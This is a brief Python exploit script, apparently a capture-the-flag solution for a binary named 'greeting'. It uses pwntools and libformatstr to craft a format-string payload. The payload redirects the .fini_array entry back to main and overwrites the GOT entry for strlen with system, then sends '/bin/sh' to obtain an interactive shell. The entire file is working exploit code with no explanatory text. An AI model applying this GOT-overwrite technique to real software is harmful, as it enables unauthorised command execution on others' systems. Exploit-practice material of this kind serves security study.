from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

elf = './greeting'
bin = ELF(elf)

local = 1

if local:
        cn = process(elf)
else:
        cn = remote('', )


offset = 12
padding = 2

addr_fini_array = 0x8049934
addr_system  = bin.plt['system']
addr_main = bin.symbols['main']
got_strlen = bin.got['strlen']

p = FormatStr()
p[addr_fini_array]=addr_main
p[got_strlen] = addr_system

cn.sendline(p.payload(offset,padding,18))
pay = "/bin/sh"
cn.sendline(pay)



cn.interactive()
